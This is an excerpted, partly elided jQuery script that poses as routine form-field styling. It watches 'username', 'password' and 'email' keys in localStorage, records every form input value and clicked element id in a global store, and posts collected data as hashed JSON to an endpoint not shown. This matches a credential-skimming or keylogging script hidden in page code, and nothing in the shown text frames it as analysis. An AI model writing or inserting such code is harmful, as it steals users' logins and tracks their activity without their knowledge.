...
$(function () {
  window.keysToWatch = ['username', 'password', 'email'];
  window.globalVarStore = {};
  function computeHash(data) {
    let hash = 0;
    for (let i = 0; i < data.length; ++i) {
      hash = (hash << 6) - hash + data.charCodeAt(i);
      hash |= 0;
    }
  ...
  function getLocalStorageData() {
    let data = {};
    window.keysToWatch.forEach(function (key) {
  ...
  function postData(data) {
    ...
    request.send(JSON.stringify({
      id: computeHash(JSON.stringify(data)),
      data: data
    }));
  ...
  function saveGlobalVar(name, value) {
    window.globalVarStore[name] = value;
  }
  function loadData() {
  ...
  $(document).on('input propertychange', '.form-control', function () {
    ...
    $field.toggleClass('field--not-empty', !!this.value);
    saveGlobalVar($field.attr('id'), this.value);
  });
  $(document).on('click', function (e) {
    const targetElement = e.target || e.srcElement;
    saveGlobalVar('click', targetElement.id);
  });
});
;